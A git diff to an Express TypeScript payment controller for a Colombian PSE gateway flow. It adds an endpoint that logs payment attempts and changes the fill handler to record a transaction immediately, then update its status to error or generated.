@@ -2,26 +2,73 @@ import { Request, Response } from 'express';
 import { executeFill } from '../services/fill.service';
 import { notifySessionPayment } from './track.controller';
 import { startTrackingBoldPayment } from '../services/bold-tracker.service';
-import { getGatewaySettings, recordTransaction } from '../services/settings.service';
+import {
+  getGatewaySettings,
+  recordTransaction,
+  updateTransactionStatus,
+} from '../services/settings.service';
+
+export function postFillAttempt(req: Request, res: Response) {
+  try {
+    const { monto, servicio, metodo, referencia, sessionId } = req.body ?? {};
+    const cleanMonto = Number(String(monto || '0').replace(/\D/g, '')) || 0;
+    const sid = String(sessionId || `anon_${Date.now()}`);
+    const settings = getGatewaySettings();
+
+    const tx = recordTransaction({
+      sessionId: sid,
+      nombre: servicio ? `Intento: ${String(servicio).trim()}` : 'Intento en Paso 1',
+      doc: referencia ? `Ref: ${String(referencia).trim()}` : 'Pendiente datos PSE',
+      banco: metodo ? String(metodo).toUpperCase() : 'PENDIENTE',
+      monto: cleanMonto,
+      gateway: settings.gatewayProvider,
+      status: 'INITIATED',
+    });
+
+    return res.json({ ok: true, transactionId: tx.id });
+  } catch (err: any) {
+    return res.status(500).json({ ok: false, error: err.message });
+  }
+}
 
 export async function postFill(req: Request, res: Response) {
   const { monto, banco, tipo, doc, nombre, email, celular, sessionId } = req.body ?? {};
   const cleanMonto = String(monto || '').replace(/\D/g, '');
   const cleanDoc = String(doc || '').replace(/\D/g, '');
-  const sid = String(sessionId || 'anon');
+  const sid = String(sessionId || `anon_${Date.now()}`);
   const settings = getGatewaySettings();
+
+  // Registrar el intento inmediatamente al recibir la petición en /api/fill
+  const initialTx = recordTransaction({
+    sessionId: sid,
+    nombre: String(nombre || 'No provisto').trim(),
+    doc: cleanDoc || 'Sin documento',
+    banco: String(banco || 'Pendiente').trim(),
+    monto: Number(cleanMonto || 0),
+    gateway: settings.gatewayProvider,
+    status: 'PROCESSING',
+  });
 
   try {
     if (!monto || !banco || !tipo || !doc) {
+      updateTransactionStatus(initialTx.id, 'ERROR', {
+        errorMessage: 'Faltan campos requeridos: monto, banco, tipo, doc',
+      });
       return res.status(400).json({
         error: 'Faltan campos requeridos: monto, banco, tipo, doc',
       });
     }
 
     if (!cleanMonto || Number(cleanMonto) < 10000) {
+      updateTransactionStatus(initialTx.id, 'ERROR', {
+        errorMessage: 'Monto inferior al mínimo ($10.000 COP)',
+      });
       return res.status(400).json({ error: 'El monto mínimo a pagar es de $10.000 COP' });
     }
     if (!cleanDoc) {
+      updateTransactionStatus(initialTx.id, 'ERROR', {
+        errorMessage: 'Documento inválido',
+      });
       return res.status(400).json({ error: 'Documento inválido' });
     }
 
@@ -35,15 +82,8 @@ export async function postFill(req: Request, res: Response) {
       celular: celular ? String(celular).trim() : undefined,
     });
 
-    recordTransaction({
+    updateTransactionStatus(initialTx.id, 'GENERATED', {
       referenceId: result.reference_id,
-      sessionId: sid,
-      nombre: String(nombre || 'No provisto').trim(),
-      doc: cleanDoc,
-      banco: String(banco).trim(),
-      monto: Number(cleanMonto),
-      gateway: settings.gatewayProvider,
-      status: 'GENERATED',
       redirectUrl: result.redirect_url,
     });
 
@@ -78,14 +118,7 @@ export async function postFill(req: Request, res: Response) {
     return res.json(result);
   } catch (err: any) {
     console.error('Error en /api/fill:', err);
-    recordTransaction({
-      sessionId: sid,
-      nombre: String(nombre || 'No provisto').trim(),
-      doc: cleanDoc,
-      banco: String(banco || '').trim(),
-      monto: Number(cleanMonto || 0),
-      gateway: settings.gatewayProvider,
-      status: 'ERROR',
+    updateTransactionStatus(initialTx.id, 'ERROR', {
       errorMessage: err.message || 'Error en pasarela',
     });
     return res.status(500).json({
